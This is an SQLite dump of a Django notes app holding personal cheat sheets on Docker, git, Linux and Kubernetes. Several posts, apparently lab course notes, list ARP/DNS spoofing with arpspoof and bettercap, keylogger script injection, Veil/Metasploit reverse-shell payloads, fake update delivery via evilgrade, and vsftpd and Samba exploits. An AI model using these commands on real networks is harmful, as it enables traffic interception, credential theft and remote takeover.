CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "sections_hashtag_post" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "hashtag_id" bigint NOT NULL REFERENCES "sections_hashtag" ("id") DEFERRABLE INITIALLY DEFERRED, "post_id" bigint NOT NULL REFERENCES "sections_post" ("id") DEFERRABLE INITIALLY DEFERRED);
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "sections_post" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "name" varchar(64) NOT NULL, "slug" varchar(64) NOT NULL UNIQUE, "description" varchar(8192) NULL, "created_date" datetime NOT NULL, "updated_date" datetime NOT NULL, "category_id" bigint NOT NULL REFERENCES "sections_category" ("id") DEFERRABLE INITIALLY DEFERRED);
INSERT INTO "sections_post" VALUES(1,'setup','7gtddol','setup
https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-compose-on-ubuntu-22-04
```
mkdir -p ~/.docker/cli-plugins/
curl -SL https://github.com/docker/compose/releases/download/v2.15.0/docker-compose-linux-x86_64 -o ~/.docker/cli-plugins/docker-compose
```
`chmod +x ~/.docker/cli-plugins/docker-compose`
`sudo chmod 666 /var/run/docker.sock`
` sudo systemctl restart docker`

delete
container 
docker ps -a

docker stop $(docker ps -a -q)
docker rm $(docker ps -a -q)
docker rmi $(docker images -a -q)

`docker system prune --volumes`','2023-01-01 20:39:05.251000','2023-02-12 19:48:22.203000',2);
INSERT INTO "sections_post" VALUES(2,'start','yjzbmhz','```
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
pip freeze > pip_requirements.txt - all packege project
```
```
python3 manage.py makemigrations
python3 manage.py migrate
python3 manage.py makemigrations - table["user_profile"]
python3 manage.py collectstatic
python3 manage.py createsuperuser
python3 manage.py runserver  0.0.0.0:8000 
python3 manage.py startapp user_profile
```
```
django-admin startproject core
python3 manage.py startapp user_profile
```','2023-01-01 20:42:09.409000','2023-01-01 20:47:54.319000',3);
INSERT INTO "sections_post" VALUES(3,'base','sx8bwn3','pwd, sd, ls, echo -  
	echo ''Hello World, coders'' > hello_coder.txt
	xxd -c 1 -b text.txt - 10
	xxd -c 1 text.txt - 16
	ascii Code sharm

    sudo kill -9 $(sudo lsof -t -i:9001) kill port

	mkdir 
	touch 

	chmod -R 777 mysite - accept to file in directory

	gksudo nautilus -   

	ls /home/atlantida/

	ls -a -  
	ls - la

	history  -  
	!55 -  

	cp - i
	rm - 

	xxd -p calc.exe calc_dump - file in damp

	xxd -r -p calc_dump.txt calc.exe - damp in file

	mv exemple ../exemple2 - 

	sudo rm exemple2 -

	rm -r some_folder/ -  

	Ctrl + a -  
	Ctrl + e -  
	Ctrl + w -   

	nano hello.txt -   

	less hello.txt -  
	cat hello.txt | less - 

	head -n 1 hello.txt -  

	tail -n 1 hello.txt -  

	grep -rin --include="*.py" " "

	grep -rin --include="*.py" " " /tmp/ -    

	which pip - where is run file
	
	///crontab  - linox
	sudo usermod -a -G crontab atlantida -     
	crontab -e - 

```
sudo echo "export PATH=$PAT:/home/dev/kubernetes" >> /etc/bash.bashrc
```','2023-01-01 20:50:12.470000','2023-02-19 06:01:56.629000',5);
INSERT INTO "sections_post" VALUES(4,'name','svdpdia','
	LAN -  
	WAN -  

	TCP/IP

	1. - FTP, SMB, HTTP, HTTPS, SSH, DNS
	2. - UDP/TCP
	3. - IP, ipv4, ipv6
	4. - Ethernet, port

	ip, NAT;

	upload text.txt

	sudo apt install -y telnet

	URL - https://www.google.com
	URI - https://www.google.com/search?q=samcart --#-- sourceid=chrome&ie=UTF-8','2023-01-01 20:52:49.836000','2023-01-01 20:53:15.130000',6);
INSERT INTO "sections_post" VALUES(5,'name','di2ddn5','Git global setup
git config --global user.name " "
git config --global user.email "dmytro.solovka@gmail.com"
Create a new repository
git clone git@gitlab.com:dmytro.solovka/test_commit_from_pycharm.git
cd test_commit_from_pycharm
git switch -c main
touch README.md
git add README.md
git commit -m "add README"
git push -u origin main
Push an existing folder
cd existing_folder
git init --initial-branch=main
git remote add origin git@gitlab.com:dmytro.solovka/test_commit_from_pycharm.git
git add .
git commit -m "Initial commit"
git push -u origin main
Push an existing Git repository
cd existing_repo
git remote rename origin old-origin
git remote add origin git@gitlab.com:dmytro.solovka/test_commit_from_pycharm.git
git push -u origin --all
git push -u origin --tags



git clone git@gitlab.com:dmytro.solovka/first_test.git


git config --global user.name "SD"

 ssh-keygen
 ls ~/.ssh/
 cat ~/.ssh/id_rsa.pub


git init - initialition
git status
git add server.py
git commit -m "init first file"
 
git diff -  


git remote add origin https://gitlab.com/dmytro.solovka/web.git
git remote -v - ...','2023-01-01 20:57:27.266000','2023-01-01 20:57:46.784000',4);
INSERT INTO "sections_post" VALUES(6,'ssh','so35h7p','convert - sudo puttygen second_app.ppk -O private-openssh -o second_app.pem
ssh conect - sudo ssh -i "second_app.pem" ubuntu@ec2-3-213-19-190.compute-1.amazonaws.com

ssh-keygen -t rsa -C "devdjangoreact@gmail.com"

adduser dev
adduser dev sudo

AllowUsers dev

sudo service ssh restart
sudo nano /etc/ssh/ssh_config

https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys-on-ubuntu-20-04
cat ~/.ssh/id_rsa.pub

PasswordAuthentication no
PermitRootLogin no
AllowUsers dev','2023-01-01 20:59:26.614000','2023-02-24 15:14:27.926000',5);
INSERT INTO "sections_post" VALUES(7,'base','8or3szl','imp	import moduleName from ''module''
imn	import ''module''
imd	import { destructuredModule } from ''module''
ime	import * as alias from ''module''
ima	import { originalName as aliasName} from ''module''
exp	export default moduleName
exd	export { destructuredModule } from ''module''
exa	export { originalName as aliasName} from ''module''
enf	export const functionName = (params) => { }
edf	export default (params) => { }
ednf	export default function functionName(params) { }
met	methodName = (params) => { }
fre	arrayName.forEach(element => { }
fof	for(let itemName of objectName { }
fin	for(let itemName in objectName { }
anfn	(params) => { }
nfn	const functionName = (params) => { }
dob	const {propName} = objectToDescruct
dar	const [propName] = arrayToDescruct
sti	setInterval(() => { }, intervalTime
sto	setTimeout(() => { }, delayTime
prom	return new Promise((resolve, reject) => { }
cmmb	comment block
cp	const { } = this.props
cs	const { } = this.state','2023-01-01 21:31:54.145000','2023-01-01 21:34:25.983000',18);
INSERT INTO "sections_post" VALUES(8,'react','ga3s1tl','imr	import React from ''react''
imrd	import ReactDOM from ''react-dom''
imrc	import React, { Component } from ''react''
imrpc	import React, { PureComponent } from ''react''
imrm	import React, { memo } from ''react''
imrr	import { BrowserRouter as Router, Route, NavLink} from ''react-router-dom''
imbr	import { BrowserRouter as Router} from ''react-router-dom''
imbrc	import { Route, Switch, NavLink, Link } from react-router-dom''
imbrr	import { Route } from ''react-router-dom''
imbrs	import { Switch } from ''react-router-dom''
imbrl	import { Link } from ''react-router-dom''
imbrnl	import { NavLink } from ''react-router-dom''
imrs	import React, { useState } from ''react''
imrse	import React, { useState, useEffect } from ''react''
redux	import { connect } from ''react-redux''
est	this.state = { }
cdm	componentDidMount = () => { }
scu	shouldComponentUpdate = (nextProps, nextState) => { }
cdup	componentDidUpdate = (prevProps, prevState) => { }
cwun	componentWillUnmount = () => { }
gdsfp	static getDerivedStateFromProps(nextProps, prevState) { }
gsbu	getSnapshotBeforeUpdate = (prevProps, prevState) => { }
sst	this.setState({ })
ssf	this.setState((state, props) => return { })
props	this.props.propName
state	this.state.stateName
rcontext	const $1 = React.createContext()
cref	this.$1Ref = React.createRef()
fref	const ref = React.createRef()
bnd	this.methodName = this.methodName.bind(this)','2023-01-01 21:34:36.636000','2023-01-01 21:34:56.804000',18);
INSERT INTO "sections_post" VALUES(9,'django-docker','5ayjjx4','docker compose exec web python manage.py migrate --noinput
docker compose exec web python manage.py dbrestore
docker compose exec web python manage.py makemigrations
docker compose exec web python manage.py migrate
docker compose exec web python manage.py createsuperuser

docker compose exec web python manage.py flush
docker compose exec web python manage.py loaddata movies.json

docker compose exec web python manage.py collectstatic','2023-01-02 16:42:11.253000','2023-01-03 15:58:10.219000',3);
INSERT INTO "sections_post" VALUES(10,'backup_postgres','k0benky','```
  docker exec -t django-on-docker-letsencrypt-db-1 pg_dumpall -c -U hello_django > dump_`date +%d-%m-%Y"_"%H_%M_%S`.sql
  cat dump_02-01-2023_16_18_06.sql | docker exec -i django-on-docker-letsencrypt-db-1 psql -U hello_django -d hello_django_dev
```','2023-01-02 16:47:13.090000','2023-01-02 18:55:11.650000',2);
INSERT INTO "sections_post" VALUES(11,'name','f2e3xa3','description','2023-01-02 17:11:31.969000','2023-01-02 17:11:31.969000',20);
INSERT INTO "sections_post" VALUES(12,'APScheduler','APScheduler','apps.py

```
from django.apps import AppConfig

class WeatherConfig(AppConfig):
    name = ''weather''

    def ready(self):
        from forecastUpdater import updater
        updater.start()
```
updater
```
from datetime import datetime
from apscheduler.schedulers.background import BackgroundScheduler
from forecastUpdater import forecastApi

def start():
    scheduler = BackgroundScheduler()
    scheduler.add_job(forecastApi.update_forecast, ''interval'', minutes=5)
    scheduler.start()
```','2023-01-02 17:11:46.731000','2023-01-03 10:24:07.735000',3);
INSERT INTO "sections_post" VALUES(13,'backupdb','gvwcwma','https://www.youtube.com/watch?v=s54HYoJ8wrs

https://django-dbbackup.readthedocs.io/en/master/installation.html','2023-01-03 00:29:38.955000','2023-01-03 10:26:07.640000',3);
INSERT INTO "sections_post" VALUES(14,'basic','cxzv2u5','`netdiscover -r 192.168.57.1/24`
`zanmap`
`arpspoof -i eth0 -t 192.168.248.2 192.168.248.129`
`arpspoof -i eth0 -t 192.168.248.129 192.168.248.2`
`echo 1 > /proc/sys/net/ipv4/ip_forward`','2023-01-05 20:00:16.030000','2023-01-05 23:22:03.039000',27);
INSERT INTO "sections_post" VALUES(16,'bettercap','vw1xtgs','`bettercap -iface eth0`
`bettercap -iface eth0 -caplet spoof.cap`

`net.probe on`
`net.recon on`
`set arp.spoof.fullduplex true`
`set arp.spoof.targets 192.168.248.129`
`arp.spoof on`
`set net.sneef.local true`
`net.sniff on`','2023-01-05 21:40:32.105000','2023-01-05 23:21:51.122000',27);
INSERT INTO "sections_post" VALUES(17,'dns.spoof','2ntsx55','`set dns.spoof.all true`
`set dns.spoof.domains zsecurity.org,*.zsecurity.org`
`dns.spoof on`','2023-01-06 15:54:56.569000','2023-01-06 15:57:17.931000',27);
INSERT INTO "sections_post" VALUES(18,'code.injection','nmqhvss','set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*:`/root/alert.js` - script in /usr/local/share/bettercap/caplets/hstshijack','2023-01-06 15:57:25.584000','2023-01-06 16:04:12.861000',27);
INSERT INTO "sections_post" VALUES(19,'web.interface','xrxc93x','```
ui.update
http.ui
```','2023-01-06 16:05:29.693000','2023-01-06 16:25:09.817000',27);
INSERT INTO "sections_post" VALUES(20,'wireshark','gatmgx7','description','2023-01-06 16:25:15.090000','2023-01-06 16:52:21.647000',27);
INSERT INTO "sections_post" VALUES(21,'fake_access_point','unw4xkh','description','2023-01-06 16:52:24.063000','2023-01-06 16:54:38.844000',27);
INSERT INTO "sections_post" VALUES(22,'nodejs','s2oo5jx','`curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash`
`source ~/.bashrc`
`nvm list-remote`
`nvm install v{version}`','2023-01-11 13:30:08.402000','2023-01-11 13:31:44.512000',5);
INSERT INTO "sections_post" VALUES(24,'name','miu276c','`npx create-react-app frontend --template typescript`','2023-01-11 21:52:11.666000','2023-01-29 07:30:55.935000',9);
INSERT INTO "sections_post" VALUES(25,'name','pjryb0o','`yarn cache clean`','2023-01-11 23:37:47.171000','2023-01-11 23:40:48.739000',7);
INSERT INTO "sections_post" VALUES(26,'metasploitable','etrp7k4','login:msfadmin
password:msfadmin','2023-01-13 22:14:23.179000','2023-01-13 22:18:56.455000',22);
INSERT INTO "sections_post" VALUES(27,'veil','hb0vre7','https://github.com/Veil-Framework/Veil

use 1-list-use 15- set LHOST/RHOST- generate

msf6 - LHOST/LPORT-set PAYLOAD windows/meterpreter/reverse_https-exploit
> evilgrade -- fike update windows 10
`/opt/evilgrade/`
`configure dap`
`show options`
`set agent /var/www/html/eveil/rev_https_8080.exe` `set endsite www.speedbit.com` `start`
`set dns.spoof.all true` `set dns.spoof.domains update.speedbit.com` `dns.spoof on`','2023-01-14 20:19:17.235000','2023-01-16 17:11:16.869000',29);
INSERT INTO "sections_post" VALUES(28,'TheFatRat','tmqhw48','https://github.com/screetsec/TheFatRat','2023-01-14 20:22:01.662000','2023-01-14 20:22:17.388000',29);
INSERT INTO "sections_post" VALUES(29,'Empire','l90ngna','https://github.com/EmpireProject/Empire','2023-01-14 20:26:30.610000','2023-01-16 13:04:05.234000',29);
INSERT INTO "sections_post" VALUES(30,'netkit-rsh','o2ttlcv','`rlogin -l root 192.168.248.130`','2023-01-16 12:13:38.824000','2023-01-16 12:31:46.716000',28);
INSERT INTO "sections_post" VALUES(31,'msfconsole','jwrditg','`msfconsole`
`use exploit/unix/ftp/vsftpd_234_backdoor`
`show options`
`set RhOSTS 192.168.248.130`
`exploit `
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
`use exploit/multi/samba/usermap_script`
`set payload cmd/unix/reverse_netcat`
`exploit `','2023-01-16 12:34:34.882000','2023-01-16 12:56:07.757000',28);
INSERT INTO "sections_post" VALUES(32,'maltego','972tpkc','description','2023-01-16 13:04:41.072000','2023-01-16 13:04:53.525000',22);
INSERT INTO "sections_post" VALUES(33,'python version','fsjgx3z','ls /usr/bin/python* - check python version
https://www.how2shout.com/linux/install-python-3-9-or-3-8-on-ubuntu-22-04-lts-jammy-jellyfish/','2023-01-21 20:40:32.496000','2023-01-21 20:56:25.853000',19);
INSERT INTO "sections_post" VALUES(34,'name','k1u7g1e','`curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh`
`curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash`
`source ~/.bashrc`
`nvm list-remote`

`nvm install v16.19.0`
`nvm use v16.19.0`','2023-01-25 12:52:31.401000','2023-01-26 01:28:36.406000',30);
INSERT INTO "sections_post" VALUES(35,'portainer','hvti8la','```
docker volume create portainer_data
```

```
docker run -d -p 8888:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce:2.9.3
```

https://techdirectarchive.com/2022/07/24/how-to-install-docker-portainer-on-linux/','2023-02-12 11:45:13.392000','2023-02-13 09:49:48.271000',2);
INSERT INTO "sections_post" VALUES(36,'splash','r7l5om6','`sudo docker run -it -p 8050:8050 --rm scrapinghub/splash`','2023-02-13 09:53:56.566000','2023-02-13 09:54:14.414000',31);
INSERT INTO "sections_post" VALUES(37,'scrapy-splash','avb863c','`pip install scrapy-splash`
https://scrapeops.io/python-scrapy-playbook/scrapy-splash/','2023-02-13 09:54:55.326000','2023-02-13 09:55:35.702000',31);
INSERT INTO "sections_post" VALUES(38,'name','zghwpb7','description 2','2023-02-13 09:54:56.508000','2023-05-23 23:05:52.494232',31);
INSERT INTO "sections_post" VALUES(40,'runbackround','jhijprw','nohup python test.py &','2023-02-17 20:02:03.794000','2023-02-17 20:02:30.237000',5);
INSERT INTO "sections_post" VALUES(41,'forse_push','d96umfg','Remove the specific commit-id:

git rebase --onto commit-id^ commit-id
and then forcibly push to GitHub:

git push --force-with-lease

ssh-keygen -t rsa -C "devdjangoreact@gmail.com"','2023-02-17 20:04:22.298000','2023-02-17 20:04:45.970000',4);
INSERT INTO "sections_post" VALUES(42,'virtualBox','a5gsl8s','minikube - https://github.com/kubernetes/minikube/releases/tag/v1.29.0
kubectl - 
```
minikube start
minikube start -p my_cluster

minikube start --cpus=4 --memory=8gb --disk-size=25gb
minikube stop
minikube delete
minikube ssh

kubectl get componentstatuses
kubectl cluster-info
kubectl get nodes

login - root

docker
tcuser

```','2023-02-19 05:19:43.259000','2023-02-19 05:41:15.959000',32);
INSERT INTO "sections_post" VALUES(43,'eksctl','ggcjcf9','eksctl 

```
eksctl version
eksctl create cluster
eksctl delete cluster 

eksctl create cluster -f mycluster.yaml
eksctl delete cluster -f mycluster.yaml

kubectl version
kubectl version --client
kubectl cluster-info
kubectl get nodes
```','2023-02-19 05:41:17.836000','2023-02-19 06:15:42.403000',32);
INSERT INTO "sections_post" VALUES(44,'minikube','6g3sjos','minikube

```
minikube version
minikube start
minikube stop
minikube delete
minikube ssh

minikube profile list

minikube delete --profile minikube

minikube start --cpus=4 --memory=8gb   --disk-size=5gb 
minikube start --cpus=2 --memory=6000mb --disk-size=4000mb
minikube start -p MYSUPERCLUSTER
minikube start --nodes 2 -p multinode-demo
minikube start --profile=mycluster --cpus 6 --memory 8192 --disk-size=50g


kubectl version
kubectl version --client
kubectl get componentstatuses
kubectl cluster-info
kubectl get nodes

```','2023-02-19 06:15:51.942000','2023-02-22 02:06:26.719000',32);
INSERT INTO "sections_post" VALUES(45,'gcloud','btbf6p1','gcloud

```
gcloud version
gcloud init
gcloud services enable container.googleapis.com

gcloud container clusters create denis
gcloud container clusters create denis --num-nodes=4
gcloud container clusters get-credentials denis
gcloud container clusters delete denis

kubectl version --client
kubectl cluster-info
kubectl get nodes
```','2023-02-19 06:16:43.627000','2023-02-19 06:17:13.080000',32);
INSERT INTO "sections_post" VALUES(46,'docker','h6tyn6s','```
docker build -t myk8sapp  .
docker login
docker tag  myk8sapp:latest  adv4000/k8sphp:latest
docker push
docker images
docker rmi XXXXXXXXX -f
docker run -it -p 1234:80 adv4000/k8sphp:latest
```','2023-02-19 06:30:21.454000','2023-02-19 06:30:41.711000',32);
INSERT INTO "sections_post" VALUES(47,'kubectl','jk1o0y5','kubectl 

```
kubectl get pods
kubectl run hello --image=nginx:latest --port=80
kubectl port-forward hello 7777:80 
kubectl describe pods hello
kubectl delete pods hello
kubectl logs hello
kubectl exec my-web -- date
kubectl exec -it my-web -- bash
kubectl apply -f myfile.yaml
kubectl delete -f myfile.yaml

kubectl get deployments
kubectl get rs
kubectl create deployment denis-deployment --image httpd:latest
kubectl describe deplyoments denis-deployment
kubectl scale deployment denis-deployment --replicas 4
kubectl autoscale deployment denis  --min=10 --max=15 --cpu-percent=80
kubectl get hpa

kubectl set image deployment/denis-deployment k8sphp=adv4000/k8sphp:version2 --record
kubectl rollout status deployment/denis-deployment 
kubectl rollout history deployment/denis-deployment
kubectl rollout undo deployment/denis-deployment 
kubectl rollout undo deployment/denis-deployment --to-revision=2
kubectl rollout restart deployment/denis-deployment 

kubectl delete deployments denis-deployment 

kubectl create deployment denis-deployment --image adv4000/k8sphp:latest
kubectl get deployment
kubectl scale deployment denis-deployment --replicas 4
kubectl expose deployment denis-deployment --type=ClusterIP --port 80
kubectl expose deployment denis-deployment --type=NodePort --port 80
kubectl expose deployment denis-deployment --type=LoadBalancer --port 80
kubectl get services
kubectl get svc
kubectl describe nodes | grep ExternalIP

kubectl delete services  my-webserver

kubectl apply -f https://projectcontour.io/quickstart/contour.yaml
kubectl get services -n projectcontour envoy -o wide
kubectl create deployment main    --image=adv4000/k8sphp:latest 
kubectl create deployment web1    --image=adv4000/k8sphp:version1
kubectl create deployment web2    --image=adv4000/k8sphp:version2
kubectl scale deployment main    --replicas 2
kubectl scale deployment web1    --replicas 2
kubectl scale deployment web2    --replicas 2
kubectl expose deployment main   --port 80   # --type=ClusterIP  DEFAULT
kubectl expose deployment web1   --port 80
kubectl expose deployment web2   --port 80
kubectl expose deployment tomcat --port 8080

kubectl get services -o wide

kubectl apply -f ingress-hosts.yaml
kubectl apply -f ingress-paths.yaml
kubectl get ingress
kubectl describe ingress
kubectl delete ns projectcontour



```','2023-02-19 06:31:20.667000','2023-02-19 06:33:50.739000',32);
INSERT INTO "sections_post" VALUES(48,'helm','sa2okui','```
helm version
helm list

helm search hub
helm search repo

helm install app1 Denis-Chart/
helm upgrade app1 Denis-Chart/ --set container.image=adv4000/k8sphp:version2

helm create MyChart
helm package Denis-Chart/
helm install app2 App-HelmChart-0.1.0.tgz
helm delete app1
helm uninstall app1

helm repo add bitnami https://charts.bitnami.com/bitnami
helm install my_website bitnami/apache -f my_values.yaml
```','2023-02-19 06:33:52.156000','2023-02-19 06:34:09.449000',32);
INSERT INTO "sections_post" VALUES(49,'checkout','eanhn48','```
git checkout -b dev
```','2023-02-21 00:41:45.129000','2023-02-21 00:42:10.720000',4);
INSERT INTO "sections_post" VALUES(50,'docker','ta4ay08','```
docker build -t myk8sapp .
```','2023-02-21 02:53:41.098000','2023-02-21 02:54:00.075000',2);
INSERT INTO "sections_post" VALUES(51,'kubeadm','qi4qljo','kubeadm 

https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/

```
sudo apt-get update
sudo apt-get install -y apt-transport-https ca-certificates curl
sudo curl -fsSLo /etc/apt/keyrings/kubernetes-archive-keyring.gpg https://packages.cloud.google.com/apt/doc/apt-key.gpg
echo "deb [signed-by=/etc/apt/keyrings/kubernetes-archive-keyring.gpg] https://apt.kubernetes.io/ kubernetes-xenial main" | sudo tee /etc/apt/sources.list.d/kubernetes.list
sudo apt-get update
sudo apt-get install -y kubelet kubeadm kubectl
sudo apt-mark hold kubelet kubeadm kubectl
sudo kubeadm init
```
```
wget https://github.com/containerd/containerd/releases/download/v1.6.12/containerd-1.6.12-linux-amd64.tar.gz
tar xvf containerd-1.6.12-linux-amd64.tar.gz
systemctl stop containerd
cd bin
cp * /usr/bin/
systemctl start containerd
```','2023-02-23 10:07:30.700000','2023-02-23 12:23:01.788000',32);
INSERT INTO "sections_post" VALUES(52,'microk8s','amczp9f','microk8s 

```
sudo apt-get install snapd
sudo snap install microk8s --classic --channel=1.26
sudo usermod -a -G microk8s $USER
sudo chown -f -R $USER ~/.kube
microk8s status --wait-ready
alias kubectl=''microk8s kubectl''
microk8s enable dns hostpath-storage
microk8s start
microk8s stop

microk8s kubectl get all --all-namespaces

microk8s enable dashboard dns
microk8s kubectl get services -n kube-system
microk8s kubectl port-forward -n kube-system service/kubernetes-dashboard --address 0.0.0.0 10443:443
```

```
microk8s enable portainer

microk8s disable portainer

```
http://127.0.0.1:30777/
https://127.0.0.1:30779/','2023-02-23 10:07:36.677000','2023-03-03 16:11:30.220000',32);
INSERT INTO "sections_post" VALUES(53,'nodes','sr070it','```
play-with-docker
docker swarm init --advertise-addr 192.168.0.28
docker swarm leave
docker node rm node3

docker stack deploy  -c ./stack.yaml wp
```','2023-02-24 15:17:54.087000','2023-02-24 16:14:22.377000',33);
INSERT INTO "sections_post" VALUES(55,'build','g6cdjpw','docker compose -f swarm_compose.yaml up --build','2023-02-24 15:17:56.374000','2023-02-28 00:15:41.828000',33);
INSERT INTO "sections_post" VALUES(56,'service','ko09ltg','```
docker service create --replicas 1 --name helloworld alpine ping docker.com
docker service ls
```','2023-02-24 15:17:57.452000','2023-02-27 06:11:53.382000',33);
INSERT INTO "sections_post" VALUES(60,'base','1t7lx4q','command1 | command2 - data from command1 to command2

echo "aa" > /tmp/file - add to file "aa"

echo "aa" | grep "a"

ls /aa 2> /tmp/err

rwxr-xr-x -- 755

r-xr-r-- 754

tail -n 10 /var/log/syslog - read 10 first line

cat, less,

ls -a

pwd, cd, chmod +x, mkdir, mv, rm, rm -r, rmdir

ssh <''_>@<_>

command > file.txt  - rewrite file

command >> file.txt - add to end file

#!/bin/bash

/etc/passwd - save password in linox

tar -cvf archive.tar mydir - add to archiv folder

tar -xvf archive.tar - create folder from archiv

sudo adduser <''_>

sudo passwd <''_>

sudo userdel <''_>

sudo mount <> <_>

sudo mount /dev/sdb1 /mnt/mydisk

sudo umount /mnt/mydisk','2023-05-24 13:45:39.201352','2023-05-24 14:34:35.062560',5);
INSERT INTO "sections_post" VALUES(62,'name','zdbmnj8','description','2023-06-03 18:10:41.606759','2023-06-03 18:10:41.606801',3);
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "token_blacklist_blacklistedtoken" ("blacklisted_at" datetime NOT NULL, "token_id" bigint NOT NULL UNIQUE REFERENCES "token_blacklist_outstandingtoken" ("id") DEFERRABLE INITIALLY DEFERRED, "id" integer NOT NULL PRIMARY KEY AUTOINCREMENT);
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
